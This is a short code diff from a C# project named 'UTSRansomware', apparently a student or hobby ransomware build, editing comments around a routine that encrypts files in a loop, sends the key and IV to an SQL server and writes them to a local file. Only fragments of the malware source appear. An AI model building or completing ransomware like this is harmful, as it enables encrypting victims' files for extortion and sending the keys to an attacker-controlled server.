@@ -54,7 +54,7 @@ namespace UTSRansomware
             }
             /* 
              * After all encryption completed save the key and iv to text file
-             * This is where the upload to a C2 should happen but I haven't implemented that yet
+             * The key and iv are also sent to SQL server
              */
             SQLManager.AddComputer(this.key, this.iv);
             SaveKeyAndIv();
@@ -74,8 +74,7 @@ namespace UTSRansomware
                 }
             }
 
-            // Using multi threaded processing to try improve speed
-            // Don't think this is working properly so will have to file
+            // Loops over each file and filePaths array and encrypts it
             foreach (string filePath in filePaths)
             {
                 string fileExtension = Path.GetExtension(filePath);
@@ -156,7 +155,7 @@ namespace UTSRansomware
             }
         }
 
-        // Writes key and iv to desktop
+        // Writes key and iv to file in working directory
         private void SaveKeyAndIv()
         {
             string fileName = "keyiv";
